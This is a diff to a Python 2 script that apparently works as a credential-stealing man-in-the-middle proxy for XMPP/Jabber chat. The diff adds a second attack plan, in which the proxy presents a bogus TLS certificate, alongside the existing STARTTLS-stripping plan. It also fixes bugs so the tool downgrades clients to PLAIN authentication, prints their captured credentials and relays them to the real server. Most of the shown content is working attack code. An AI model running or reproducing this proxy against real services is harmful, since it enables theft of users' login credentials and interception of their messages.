@@ -7,7 +7,7 @@ PORT = 5222
 BUFSIZE = 4096
 
 '''
-The Plan:
+Plan A (Strip TLS):
 * Client connects, gives us server name
 * We respond, tell it features=PLAIN
 * Client gives us creds
@@ -16,6 +16,22 @@ The Plan:
 * We do STARTTLS, send creds to server
 * Tell client creds worked
 * Relay!
+
+Plan B (MitM TLS):
+* Client connects, gives us server name
+* We respond, tell it STARTTLS
+* Client starts TLS
+* We send client bogus cert, client accepts
+* Client reconnects, asks for features
+* We give client features=PLAIN
+* Client gives us creds
+* We connect to server, give server name
+* Server sends us features=STARTTLS
+* We do STARTTLS, send creds to server
+* Tell client creds worked
+* Relay!
+
+To do plan B, you'll need to generate a certificate and key. See http://docs.python.org/library/ssl#ssl-certificates for more details
 '''
 
 # Used to impersonate server
@@ -56,7 +72,6 @@ def dotarget(clientsock,target,name,credblob):
 		
 		# Receive STARTTLS==OK
 		pkt = targetsock.recv(BUFSIZE)
-		print pkt
 		if 'proceed' not in pkt:
 			print pkt
 			raise Exception("Didn't receive STARTTLS <proceed>")
@@ -123,17 +138,21 @@ def child(sock,target,certfile='',keyfile=''):
 	try:
 		# Receive XML Header
 		pkt = sock.recv(BUFSIZE)
+		if pkt == '':
+			raise Exception("Didn't receive XML Header")					
 		
 		# Receive Server Name
 		pkt = sock.recv(BUFSIZE)
-		m = re.search("to='([\w\.]+)'",req1)
+		if pkt == '':
+			raise Exception("Didn't receive server name")			
+		m = re.search("to='([\w\.]+)'",pkt)
 		name = m.group(1)
 		print 'hostname:', name
 		
 		# Send Name==OK
 		sock.send(packet0 % name)
 
-		if certfile != '' and keyfile != '':
+		if certfile == '' or keyfile == '':
 			# Send Features: no TLS & PLAIN auth
 			sock.send(packet1)
 			
@@ -159,16 +178,16 @@ def child(sock,target,certfile='',keyfile=''):
 			# Send STARTTLS==OK
 			sock.send(packet2)
 			
+			print 'client connection is switching to TLS'
 			sslsock = ssl.wrap_socket(sock,server_side=True,suppress_ragged_eofs=False,certfile=certfile,keyfile=keyfile)
 			try:
-				# Receive XML Header
-				pkt = sslsock.recv(BUFSIZE)
-				
 				# Receive Server Name
 				pkt = sslsock.recv(BUFSIZE)
+				if pkt == '':
+					raise Exception("Didn't receive server name [TLS]")				
 
 				# Send Name==OK
-				sslsock.send(packet0 % name)				
+				sslsock.send(packet0 % name)			
 
 				# Send Features: no TLS & PLAIN auth
 				sslsock.send(packet1)
@@ -181,9 +200,10 @@ def child(sock,target,certfile='',keyfile=''):
 					print "credentials:",creds
 					dotarget(sslsock,target,name,credblob)
 				else:
-					print "Client doesn't like PLAIN or our TLS certificate"
+					print "Client doesn't like our TLS certificate"
 				sslsock.close()
 			except Exception as e:
+				print "closing client SSL socket",e
 				sslsock.close()
 				return
 	except Exception as e:
@@ -191,8 +211,10 @@ def child(sock,target,certfile='',keyfile=''):
 		sock.close()
 
 if __name__=='__main__': 
+	keyfile = ''
+	certfile = ''
 	if len(sys.argv) < 2:
-		sys.exit('Usage: %s TARGETHOST\nExample: %s jabber.yourcompany.org' % sys.argv[0], sys.argv[0])
+		sys.exit('Usage: %s TARGETHOST <KEYFILE> <CERTFILE>\nExample: %s jabber.yourcompany.org\nExample: %s jabber.yourcompany.org key.pem cert.pem' % sys.argv[0], sys.argv[0], sys.argv[0])
 	target = sys.argv[1]
 	if len(sys.argv) == 4:
 		keyfile = sys.argv[2]
